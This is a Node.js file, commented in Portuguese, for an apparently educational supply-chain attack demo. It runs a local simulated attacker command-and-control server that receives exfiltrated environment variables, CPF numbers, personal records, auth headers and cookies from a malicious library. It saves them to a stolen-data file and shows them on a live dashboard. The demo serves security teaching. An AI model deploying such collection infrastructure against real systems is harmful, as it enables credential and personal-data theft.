// ============================================================
//  SERVIDOR DO ATACANTE (Command & Control simulado)
//
//  Este servidor recebe os dados exfiltrados pela lib maliciosa.
//  Em um ataque real, estaria em um servidor remoto controlado
//  pelo atacante (ex: VPS anônima, domínio descartável).
//
//  Aqui rodamos localmente para fins de demonstração.
//
//  Rotas:
//    POST /coletar       — recebe dados da lib maliciosa
//    GET  /logs/stream   — SSE: stream de eventos ao vivo (F12)
//    GET  /              — dashboard HTML em tempo real
// ============================================================

const http = require("http");
const fs = require("fs");
const path = require("path");

const PORTA = 3001;
const ARQUIVO_LOG = path.join(__dirname, "..", "stolen-data", "dados-roubados.json");
let contadorColetas = 0;

// ─── CLIENTES SSE CONECTADOS ─────────────────────────────────
// Cada aba do navegador que abrir /logs/stream vira um cliente
const clientesSSE = new Set();

function transmitirEvento(dados) {
  const payload = "data: " + JSON.stringify(dados) + "\n\n";
  for (const cliente of clientesSSE) {
    cliente.write(payload);
  }
}

// ─── CORES PARA O TERMINAL ───────────────────────────────────
const cor = {
  vermelho: "\x1b[31m", verde: "\x1b[32m", amarelo: "\x1b[33m",
  ciano: "\x1b[36m", branco: "\x1b[37m", negrito: "\x1b[1m",
  reset: "\x1b[0m", fundo_vermelho: "\x1b[41m",
};

function linha(c = "═", n = 60) { return c.repeat(n); }

// ─── INICIALIZAÇÃO ───────────────────────────────────────────
const pastaLog = path.dirname(ARQUIVO_LOG);
if (!fs.existsSync(pastaLog)) fs.mkdirSync(pastaLog, { recursive: true });
fs.writeFileSync(ARQUIVO_LOG, "[]");

// ─── LOG TERMINAL ────────────────────────────────────────────

function logCabecalho() {
  console.clear();
  console.log(cor.vermelho + cor.negrito);
  console.log(linha());
  console.log("  ⚠  SERVIDOR DO ATACANTE (C2) — SIMULAÇÃO EDUCACIONAL");
  console.log(linha() + cor.reset);
  console.log(cor.amarelo);
  console.log("  Porta:      " + PORTA);
  console.log("  Dashboard:  http://localhost:" + PORTA);
  console.log("  SSE stream: http://localhost:" + PORTA + "/logs/stream  (F12 > Network)");
  console.log("  Log:        stolen-data/dados-roubados.json");
  console.log("\n  Aguardando dados exfiltrados..." + cor.reset);
  console.log(cor.vermelho + "  " + linha("─") + cor.reset + "\n");
}

function logDadosRecebidos(dados) {
  contadorColetas++;
  console.log(cor.fundo_vermelho + cor.branco + cor.negrito +
    "  🚨 COLETA #" + contadorColetas + " — DADOS INTERCEPTADOS! " + cor.reset + "\n");
  console.log(cor.ciano + "  📅 Timestamp:  " + cor.reset + dados.timestamp);
  console.log(cor.ciano + "  💻 Hostname:   " + cor.reset + dados.hostname);
  console.log(cor.ciano + "  📦 Origem:     " + cor.reset + dados.origem_lib);
  console.log(cor.ciano + "  📊 Itens:      " + cor.reset + dados.dados.length + " registro(s)\n");

  dados.dados.forEach((item, i) => {
    console.log(cor.amarelo + "  ┌─ Item " + (i + 1) + ": " + item.tipo + cor.reset);
    switch (item.tipo) {
      case "VARIAVEIS_DE_AMBIENTE":
        for (const [k, v] of Object.entries(item.capturadas))
          console.log(cor.vermelho + "  │  🔑 " + k + " = " + v + cor.reset);
        break;
      case "CPF":
        console.log(cor.vermelho + "  │  🪪 CPF: " + item.valor + cor.reset);
        break;
      case "CADASTRO_COMPLETO":
        for (const [k, v] of Object.entries(item.dados))
          console.log(cor.vermelho + "  │  👤 " + k + ": " + v + cor.reset);
        break;
      case "DADOS_SENSIVEIS_EM_TEXTO":
        for (const [t, v] of Object.entries(item.encontrados))
          console.log(cor.vermelho + "  │  🔍 " + t + ": " + JSON.stringify(v) + cor.reset);
        break;
      case "REQUISICAO_HTTP":
        console.log(cor.vermelho + "  │  🌐 " + item.metodo + " " + item.url + cor.reset);
        if (item.body && Object.keys(item.body).length)
          console.log(cor.vermelho + "  │  📦 " + JSON.stringify(item.body) + cor.reset);
        break;
    }
    console.log(cor.amarelo + "  └" + "─".repeat(50) + cor.reset + "\n");
  });

  console.log(cor.verde + "  ✅ Total de coletas: " + contadorColetas + cor.reset);
  console.log(cor.vermelho + "  " + linha("─") + cor.reset + "\n");
}

// ─── DASHBOARD HTML ──────────────────────────────────────────
const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>⚠️ C2 Dashboard — Atacante</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0a0a; color: #e0e0e0;
      font-family: 'Courier New', monospace; font-size: 14px;
    }
    header {
      background: #1a0000; border-bottom: 2px solid #cc0000;
      padding: 16px 24px; display: flex; align-items: center; gap: 16px;
    }
    header h1 { color: #ff3333; font-size: 20px; }
    header .badge {
      background: #cc0000; color: #fff; padding: 4px 10px;
      border-radius: 4px; font-size: 12px;
    }
    .status-bar {
      background: #111; border-bottom: 1px solid #333;
      padding: 8px 24px; display: flex; gap: 32px; font-size: 12px; color: #888;
    }
    .status-bar span { color: #0f0; }
    #contador { color: #ff4444; font-weight: bold; }
    main { padding: 20px 24px; }
    #feed { display: flex; flex-direction: column; gap: 12px; }
    .card {
      background: #111; border: 1px solid #2a0000;
      border-left: 4px solid #cc0000; border-radius: 6px;
      padding: 14px 18px; animation: entrar 0.4s ease;
    }
    @keyframes entrar {
      from { opacity: 0; transform: translateY(-10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    .card-header {
      display: flex; justify-content: space-between; align-items: center;
      margin-bottom: 10px;
    }
    .card-num { color: #ff4444; font-weight: bold; font-size: 16px; }
    .card-ts  { color: #555; font-size: 11px; }
    .meta { display: flex; gap: 20px; margin-bottom: 10px; flex-wrap: wrap; }
    .meta-item { font-size: 12px; }
    .meta-item .label { color: #555; }
    .meta-item .value { color: #88ccff; }
    .itens { display: flex; flex-direction: column; gap: 8px; margin-top: 10px; }
    .item {
      background: #0e0e0e; border: 1px solid #1a1a1a;
      border-radius: 4px; padding: 10px 14px;
    }
    .item-tipo {
      font-size: 11px; font-weight: bold; margin-bottom: 6px;
      text-transform: uppercase; letter-spacing: 1px;
    }
    .tipo-VARIAVEIS_DE_AMBIENTE .item-tipo { color: #ff8800; }
    .tipo-CPF .item-tipo                  { color: #ff4444; }
    .tipo-CADASTRO_COMPLETO .item-tipo    { color: #ff4444; }
    .tipo-DADOS_SENSIVEIS_EM_TEXTO .item-tipo { color: #ffcc00; }
    .tipo-REQUISICAO_HTTP .item-tipo      { color: #aa88ff; }
    .item-campo { display: flex; gap: 8px; font-size: 13px; padding: 2px 0; }
    .item-campo .k { color: #666; min-width: 120px; }
    .item-campo .v { color: #ff6666; word-break: break-all; }
    .vazio {
      text-align: center; color: #333; padding: 60px 0;
      font-size: 16px;
    }
    .vazio p { margin-top: 8px; font-size: 13px; color: #222; }
    .pulse { animation: pulsar 1s infinite; display: inline-block; }
    @keyframes pulsar { 0%,100%{opacity:1} 50%{opacity:0.3} }
    /* Realce para SSE no F12 */
    .tip {
      background: #0d1117; border: 1px solid #30363d;
      border-radius: 6px; padding: 10px 16px; margin-bottom: 16px;
      font-size: 12px; color: #8b949e;
    }
    .tip strong { color: #58a6ff; }
  </style>
</head>
<body>
  <header>
    <h1>⚠️ C2 Dashboard — Servidor do Atacante</h1>
    <span class="badge">SIMULAÇÃO EDUCACIONAL</span>
  </header>

  <div class="status-bar">
    <div>Conexão SSE: <span id="conn-status">conectando...</span></div>
    <div>Coletas recebidas: <span id="contador">0</span></div>
    <div>Porta: <span>3001</span></div>
  </div>

  <main>
    <div class="tip">
      💡 <strong>Para ver no F12:</strong>
      Abra DevTools → aba <strong>Network</strong> → filtre por <strong>EventSource</strong> (ou "Fetch/XHR") →
      clique em <strong>stream</strong> → aba <strong>EventStream</strong> para ver cada evento SSE chegando ao vivo.
    </div>
    <div id="feed">
      <div class="vazio" id="vazio">
        <span class="pulse">⏳</span> Aguardando dados exfiltrados...
        <p>Faça uma requisição na API vítima (porta 3000) para ver o ataque aqui.</p>
      </div>
    </div>
  </main>

  <script>
    const feed = document.getElementById("feed");
    const contador = document.getElementById("contador");
    const connStatus = document.getElementById("conn-status");
    let total = 0;

    // ─── Conexão SSE ────────────────────────────────────────
    const sse = new EventSource("/logs/stream");

    sse.onopen = () => {
      connStatus.textContent = "✅ conectado";
      connStatus.style.color = "#0f0";
    };

    sse.onerror = () => {
      connStatus.textContent = "❌ desconectado";
      connStatus.style.color = "#f44";
    };

    sse.onmessage = (e) => {
      const dados = JSON.parse(e.data);
      total++;
      contador.textContent = total;
      document.getElementById("vazio")?.remove();
      feed.insertBefore(criarCard(dados, total), feed.firstChild);
    };

    // ─── Renderização ────────────────────────────────────────
    function criarCard(dados, num) {
      const card = document.createElement("div");
      card.className = "card";
      card.innerHTML = \`
        <div class="card-header">
          <span class="card-num">🚨 Coleta #\${num}</span>
          <span class="card-ts">\${dados.timestamp}</span>
        </div>
        <div class="meta">
          <div class="meta-item"><span class="label">💻 Host: </span><span class="value">\${dados.hostname}</span></div>
          <div class="meta-item"><span class="label">🖥 OS: </span><span class="value">\${dados.plataforma}</span></div>
          <div class="meta-item"><span class="label">📦 Lib: </span><span class="value">\${dados.origem_lib}</span></div>
          <div class="meta-item"><span class="label">📂 Dir: </span><span class="value">\${dados.diretorio}</span></div>
        </div>
        <div class="itens">\${dados.dados.map(renderItem).join("")}</div>
      \`;
      return card;
    }

    function renderItem(item) {
      const tipo = item.tipo;
      let campos = "";

      if (tipo === "VARIAVEIS_DE_AMBIENTE") {
        campos = Object.entries(item.capturadas)
          .map(([k, v]) => campo("🔑 " + k, v)).join("");
      } else if (tipo === "CPF") {
        campos = campo("🪪 CPF", item.valor);
      } else if (tipo === "CADASTRO_COMPLETO") {
        campos = Object.entries(item.dados)
          .map(([k, v]) => campo(k, v)).join("");
      } else if (tipo === "DADOS_SENSIVEIS_EM_TEXTO") {
        campos = Object.entries(item.encontrados)
          .map(([k, v]) => campo("🔍 " + k, JSON.stringify(v))).join("");
        campos += campo("Texto original", item.texto_original);
      } else if (tipo === "REQUISICAO_HTTP") {
        campos = campo("🌐 " + item.metodo, item.url);
        if (item.headers.authorization) campos += campo("🔐 Authorization", item.headers.authorization);
        if (item.headers.cookie) campos += campo("🍪 Cookie", item.headers.cookie);
        if (item.body) campos += campo("📦 Body", JSON.stringify(item.body));
      }

      return \`<div class="item tipo-\${tipo}">
        <div class="item-tipo">\${tipo.replace(/_/g, " ")}</div>
        \${campos}
      </div>\`;
    }

    function campo(k, v) {
      return \`<div class="item-campo"><span class="k">\${k}</span><span class="v">\${v}</span></div>\`;
    }
  </script>
</body>
</html>`;

// ─── SERVIDOR HTTP ───────────────────────────────────────────

const servidor = http.createServer((req, res) => {

  // Dashboard HTML
  if (req.method === "GET" && req.url === "/") {
    res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
    res.end(DASHBOARD_HTML);
    return;
  }

  // SSE — stream de eventos ao vivo para o navegador
  if (req.method === "GET" && req.url === "/logs/stream") {
    res.writeHead(200, {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
      "Access-Control-Allow-Origin": "*",
    });
    res.write(": conectado\n\n"); // comentário SSE para confirmar conexão

    clientesSSE.add(res);
    req.on("close", () => clientesSSE.delete(res));
    return;
  }

  // Recebe dados exfiltrados da lib maliciosa
  if (req.method === "POST" && req.url === "/coletar") {
    let corpo = "";
    req.on("data", (pedaco) => { corpo += pedaco.toString(); });
    req.on("end", () => {
      try {
        const dados = JSON.parse(corpo);

        // Persiste no arquivo JSON
        const existentes = JSON.parse(fs.readFileSync(ARQUIVO_LOG, "utf-8"));
        existentes.push(dados);
        fs.writeFileSync(ARQUIVO_LOG, JSON.stringify(existentes, null, 2));

        // Log no terminal
        logDadosRecebidos(dados);

        // Transmite para todos os dashboards abertos (SSE)
        transmitirEvento(dados);

        res.writeHead(200);
        res.end("ok");
      } catch {
        res.writeHead(400);
        res.end("erro");
      }
    });
    return;
  }

  res.writeHead(404);
  res.end("nao encontrado");
});

servidor.listen(PORTA, () => {
  logCabecalho();
});
